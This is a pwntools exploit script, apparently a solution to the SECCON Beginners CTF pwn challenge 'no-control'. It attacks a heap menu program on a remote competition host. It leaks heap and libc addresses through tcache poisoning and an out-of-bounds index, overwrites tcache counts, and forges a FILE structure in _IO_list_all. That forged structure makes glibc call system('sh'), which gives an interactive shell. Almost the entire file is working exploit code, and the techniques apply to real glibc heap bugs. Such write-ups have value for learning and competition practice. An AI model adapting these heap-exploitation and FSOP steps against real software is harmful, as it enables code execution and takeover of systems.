from pwn import *

e = ELF('./chall_patched')
l = ELF('./libc.so.6')

HOST = 'no-control.beginners.seccon.games'
PORT = 9005

context.binary = e 
context.terminal = ["tmux", "splitw", "-h"]

gs = '''
b main
c
'''

def start():
    if args.GDB:
        return gdb.debug([e.path], gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST, PORT)  
    else:
        return process([e.path])

io = start()

def create(idx : int):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b': ', str(idx).encode())

def read(idx : int):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b': ', str(idx).encode())
    return io.recvline()

def update(idx : int, data: bytes):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b': ', str(idx).encode())
    io.sendafter(b': ', data)

def delete(idx : int):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b': ', str(idx).encode())

def ex():
    io.sendlineafter(b'> ', b'5')

create(0) # A
create(1) # B
create(2) # C
create(3) # D

# 1: heap base leak
delete(0)
create(0)
heap_base = unpack(read(0).rstrip().ljust(8, b'\0')) << 12
log.info('heap_base = %#016lx'%(heap_base))

# 2: libc base leak
chunkB = heap_base + 0x290 + 0x90
chunkC = chunkB + 0x90

# tcache(0x90): B -> A
delete(0)
delete(1)

# tcache(0x90): B -> C
update(-1, pack(((chunkB + 0x10)>>12) ^ chunkC + 0x10) + b'\n')

# tcache(0x90):
create(1)
create(4)
create(0)

# tcache(0x90): B -> A
delete(0)
delete(1)

# tcahce(0x90): B -> &tcache
update(-1, pack(((chunkB + 0x10)>>12) ^ heap_base) + b'\n')

# overwrite counts[7] with 7
create(1)
create(0)
update(0, pack(0) + pack(0x291) + pack(0x0) + pack(0x7000000000000))

delete(2)
l.address = unpack(read(4).rstrip().ljust(8, b'\0')) - 0x219ce0
log.info('libc_base = %#016lx'%(l.address))

# overwrite counts[7] with 0
update(0, pack(0) + pack(0x291) + pack(0x0) + pack(0))
create(0)

# 3: FSOP
create(0) # A
create(1) # B
create(2) # C
create(3) # D
create(4) # E

chunkA = heap_base + 0x560
wide_data = wide_vtable = chunkA + 0xf0

update(0, b'  sh\0\n')
update(
    1, 
    b'\0' * 0x10 \
    + pack(wide_data) \
    + b'\0' * 0x18 \
    + p32(1) \
    + b'\0' * 0x14 \
    + pack(l.sym['_IO_wfile_jumps']) \
    + b'\0' * 0x20 \
    + pack(1) \
    + b'\0' * 0x8
)
update(
    2, 
    b'\0' * 0x28 \
    + pack(l.sym['system']) # _do_allocate \
    + b'\n'
)
update(
    3,
    b'\0' * 0x10 \
    + pack(wide_vtable)
)

# tcahce(0x90): D -> C
delete(2)
delete(3)

# tcache(0x90): D -> &_IO_list_all
chunkD = chunkA + 0x90 * 3
update(-1, pack(((chunkD + 0x10)>>12) ^ l.sym['_IO_list_all']) + b'\n')

create(3)
create(2)
update(2, pack(chunkA + 0x10) + b'\n')

ex()

io.interactive()
